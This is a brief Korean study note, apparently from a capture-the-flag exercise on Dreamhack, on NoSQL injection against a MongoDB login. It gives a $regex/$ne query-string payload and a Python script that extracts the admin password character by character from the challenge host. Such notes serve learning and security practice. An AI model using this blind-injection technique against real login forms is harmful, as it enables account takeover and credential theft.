#web-hacking #incomplete
mongodb 파라미터는 json으로 받기 때문에, 그냥 db에 sql injection 하듯이 실행하면 안된다
`?uid[$regex]=^ad&upw[$ne]=^D.{`
# Payload
```python
import requests
import string

URL = "http://host8.dreamhack.games:15346/login"
CHARSET = string.ascii_lowercase + string.digits

flag = ""
for i in range(33):
    for c in CHARSET:
        print(f"Trying: {flag + c}", end="\r")
        response = requests.get(URL, params={
            'uid[$regex]': '^ad',
            'upw[$regex]': '^D.{%s'%(flag+c)
        })
        if "admin" in response.text:
            flag += c
            print(f"Current flag: {flag}")
            break
```
- NoSQL JSON Special 키워드